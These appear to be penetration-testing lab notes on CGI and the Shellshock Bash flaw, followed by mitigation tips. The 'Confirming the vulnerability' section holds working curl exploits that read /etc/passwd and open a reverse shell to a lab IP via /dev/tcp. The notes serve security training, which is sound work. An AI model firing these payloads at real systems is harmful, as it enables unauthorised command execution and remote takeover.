A [Common Gateway Interface (CGI)](https://www.w3.org/CGI/) is used to help a web server render dynamic pages and create a customized response for the user making a request via a web application. CGI applications are primarily used to access other applications running on a web server. CGI is essentially middleware between web servers, external databases, and information sources. CGI scripts and programs are kept in the `/CGI-bin` directory on a web server and can be written in C, C++, Java, PERL, etc. CGI scripts run in the security context of the web server. They are often used for guest books, forms (such as email, feedback, registration), mailing lists, blogs, etc. These scripts are language-independent and can be written very simply to perform advanced tasks much easier than writing them using server-side programming languages.

CGI scripts/applications are typically used for a few reasons:
- If the webserver must dynamically interact with the user
- When a user submits data to the web server by filling out a form. The CGI application would process the data and return the result to the user via the webserver

![Diagram showing CGI program flow: 1. Browser sends URL to server. 2. Server uses CGI to run program. 3. Program runs. 4. Program sends output to server. 5. Server returns output to browser.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/cgi.gif)

[Graphic source](https://www.tcl.tk/man/aolserver3.0/cgi.gif)

Broadly, the steps are as follows:
- A directory is created on the web server containing the CGI scripts/applications. This directory is typically called `CGI-bin`.
- The web application user sends a request to the server via a URL, i.e, [https://acme.com/cgi-bin/newchiscript.pl](https://acme.com/cgi-bin/newchiscript.pl)
- The server runs the script and passed the resultant output back to the web client
## CGI Attacks
Shellshock (aka, "Bash bug") vulnerability via CGI ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)). It is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables.
```sh
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

When the above variable is assigned, Bash will interpret the `y='() { :;};'` portion as a function definition for a variable `y`. The function does nothing but returns an exit code `0`, but when it is imported, it will execute the command `echo vulnerable-shellshock` if the version of Bash is vulnerable.
## Hands-on Example
### Enumeration
```sh
# 1 - FIRST FUZZ FOR DIRECTORIES w/ directory-list-medium.txt => /FUZZ BUT ALSO /FUZZ/
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
...
/access.cgi           (Status: 200) [Size: 0]
```
### Confirming the vulnerability
```sh
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

# Revshell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
## Mitigation
This [blog post](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability) contains useful tips for mitigating the Shellshock vulnerability.
- Update the version of Bash on the affected system. 
- If update is not possible, ensure the system is not exposed to the internet and then evaluate if the host can be decommissioned. 
- If it is a critical host and the organization chooses to accept the risk, a temporary workaround could be firewalling off the host on the internal network as best as possible.

